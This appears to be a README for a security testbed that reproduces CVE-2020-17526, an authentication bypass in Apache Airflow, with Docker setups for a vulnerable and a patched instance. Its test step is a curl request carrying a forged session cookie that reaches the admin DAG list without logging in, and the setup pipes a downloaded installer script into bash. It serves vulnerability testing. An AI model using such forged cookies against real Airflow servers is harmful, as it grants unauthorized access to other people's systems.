# requirements setup
spin up an `Ubuntu 22.04` fresh instance and log in as root.
```bash
apt update
apt install dos2unix
wget -q -O - "https://get.docker.com/" | dos2unix | bash
# clone the repo
# cd security-testbeds/apache/airflow/CVE-2020-17526
```
# setup Vulnerable instance
## Initialize the database
```bash
docker compose -f docker-compose-vulnerable.yml run airflow-init
```
## Start service
```bash
docker compose -f docker-compose-vulnerable.yml up -d
```
## test the exploit
```bash
curl 'http://127.0.0.1:8080/admin/' \
  -H 'Cookie: JSESSIONID=43EB3A020DF8B832F01E6F843B91B7B7; argocd.token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhcmdvY2QiLCJzdWIiOiJhZG1pbjpsb2dpbiIsImV4cCI6MTcxMTMyOTA1NSwibmJmIjoxNzExMjQyNjU1LCJpYXQiOjE3MTEyNDI2NTUsImp0aSI6IjE2MjlkMmZmLWRmYzktNDA0ZC05ZTNkLTE1Nzc4ZTYwZGNkNiJ9.-nK5IcmUexvjiUFgafTvlgPn1UzunrJn1-0BEOZVflY; session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyX2lkIjoiMSJ9.ZgdmZA.GDwzAupY1c9AXYDbLRvjSiZCVw0'
```
in a successfull exploitation, you should not be redirected to login page. on the other hand, you should receive the list of DAGs.
# setup secure instance
## Initialize the database
```bash
docker compose -f docker-compose-secure.yml run airflow-init
```
## Start service
```bash
docker compose -f docker-compose-secure.yml up -d
```

Ref:
https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-17526
